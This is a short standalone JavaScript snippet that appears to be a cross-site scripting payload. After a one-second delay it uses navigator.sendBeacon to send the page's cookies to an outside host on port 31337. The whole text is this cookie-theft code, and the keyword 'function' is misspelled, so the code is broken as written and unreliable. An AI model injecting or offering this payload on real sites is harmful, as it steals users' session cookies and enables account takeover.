
funcion send(){
  navigator.sendBeacon('http://4z.is:31337', document.cookie)
}

setTimeout(send, 1000);
